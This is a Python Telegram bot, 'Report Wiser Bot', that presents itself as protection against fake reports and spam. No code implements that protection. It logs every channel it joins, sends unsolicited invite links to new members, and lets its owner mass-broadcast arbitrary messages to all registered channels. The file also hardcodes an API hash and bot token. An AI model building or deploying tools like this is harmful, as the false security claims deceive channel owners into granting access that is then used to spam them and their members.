#!/usr/bin/env python3
"""
REPORT WISER BOT - RAILWAY FIXED
"""
import asyncio
import sqlite3
import os
import sys
from datetime import datetime
from telethon import TelegramClient, events

# ============ CONFIG ============
API_ID = 31486711
API_HASH = "1b9f690d42fa6a15e37043ae1b6f03e6"
BOT_TOKEN = "8921414065:AAE8hzvqXe7J1CUPd6Win6cYTOdnhwf15vA"
OWNER_ID = 8935807032

SECURED_MSG = """🔒 CHANNEL SECURED BY REPORT WISER BOT 🔒

✅ This channel is now protected
✅ Fake reports will be blocked
✅ 24/7 monitoring active
✅ Content secured

Report Wiser Bot - Your Channel Guardian"""

WELCOME_MSG = """┏━━━━━ 👋 WELCOME 👋 ━━━━━┓

Hello There! I'm the Report Protection Bot – your channel's guardian.

✨ Features:
  ┣━ Protect from spam reports
  ┣━ Prevent fake reports
  ┣━ Monitor suspicious activity
  ┗━ Secure your content 24/7

Join for more updates :- https://t.me/+tB0pV9BlQ2xkN2Fl"""

# ============ DATABASE ============
db = sqlite3.connect("channels.db", check_same_thread=False)
cursor = db.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS channels (chat_id INTEGER PRIMARY KEY, title TEXT)")
db.commit()

class ReportWiserBot:
    def __init__(self):
        self.client = TelegramClient("rw_bot", API_ID, API_HASH)
        print("[+] Bot starting...")

    def add_channel(self, chat_id, title):
        cursor.execute("INSERT OR REPLACE INTO channels (chat_id, title) VALUES (?, ?)", (chat_id, title))
        db.commit()

    def get_channels(self):
        cursor.execute("SELECT chat_id, title FROM channels")
        return cursor.fetchall()

    def count(self):
        cursor.execute("SELECT COUNT(*) FROM channels")
        return cursor.fetchone()[0]

    async def broadcast(self, message):
        channels = self.get_channels()
        success = 0
        for chat_id, title in channels:
            try:
                await self.client.send_message(int(chat_id), message)
                success += 1
                print(f"[+] Sent: {title}")
            except Exception as e:
                print(f"[-] Failed: {title}")
            await asyncio.sleep(0.3)
        return success

    async def start(self):
        await self.client.start(bot_token=BOT_TOKEN)
        me = await self.client.get_me()
        print(f"[+] Bot: @{me.username}")

        # ===== ADMIN ADDED =====
        @self.client.on(events.ChatAction)
        async def on_admin_added(event):
            if event.user_added:
                for uid in event.user_added:
                    if uid == (await self.client.get_me()).id:
                        try:
                            chat = event.chat
                            self.add_channel(chat.id, chat.title)
                            await self.client.send_message(chat.id, SECURED_MSG)
                            print(f"[+] Secured: {chat.title}")
                            await self.client.send_message(OWNER_ID, f"✅ Added to: {chat.title}\nTotal: {self.count()}")
                        except Exception as e:
                            print(f"[-] Error: {e}")

        # ===== NEW MEMBER =====
        @self.client.on(events.ChatAction)
        async def on_new_member(event):
            if event.user_added:
                for uid in event.user_added:
                    if uid != (await self.client.get_me()).id:
                        try:
                            user = await self.client.get_entity(uid)
                            await self.client.send_message(uid, WELCOME_MSG)
                            print(f"[+] Welcome: {user.first_name}")
                        except:
                            pass

        # ===== OWNER COMMANDS =====
        @self.client.on(events.NewMessage)
        async def owner_cmd(event):
            if not event.is_private:
                return
            if event.sender_id != OWNER_ID:
                await event.reply("❌ Unauthorized")
                return

            msg = event.raw_text.strip()

            if msg == "/start":
                await event.reply(f"🤖 Report Wiser Bot\nChannels: {self.count()}\n\nCommands:\n/broadcast msg\n/channels\n/status")

            elif msg == "/channels":
                ch = self.get_channels()
                if not ch:
                    await event.reply("No channels.")
                    return
                txt = "📋 CHANNELS:\n"
                for i, (_, title) in enumerate(ch):
                    txt += f"{i+1}. {title}\n"
                await event.reply(txt)

            elif msg == "/status":
                await event.reply(f"📊 Channels: {self.count()}\n✅ Running")

            elif msg.startswith("/broadcast "):
                bmsg = msg[11:].strip()
                if not bmsg:
                    await event.reply("❌ /broadcast message")
                    return
                await event.reply(f"📤 Broadcasting to {self.count()} channels...")
                sent = await self.broadcast(bmsg)
                await event.reply(f"✅ Sent: {sent}")

            else:
                await event.reply("❌ /start for menu")

        # ===== REGISTER EXISTING =====
        print("[*] Registering channels...")
        try:
            dialogs = await self.client.get_dialogs()
            for d in dialogs:
                if d.is_channel:
                    self.add_channel(d.id, d.title)
                    print(f"[+] {d.title}")
        except:
            pass

        await self.client.send_message(OWNER_ID, f"✅ Bot started!\nChannels: {self.count()}\n/start")
        print(f"[+] Ready! Channels: {self.count()}")
        await self.client.run_until_disconnected()

    def run(self):
        try:
            asyncio.run(self.start())
        except KeyboardInterrupt:
            print("\n[!] Stopped")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    bot = ReportWiserBot()
    bot.run()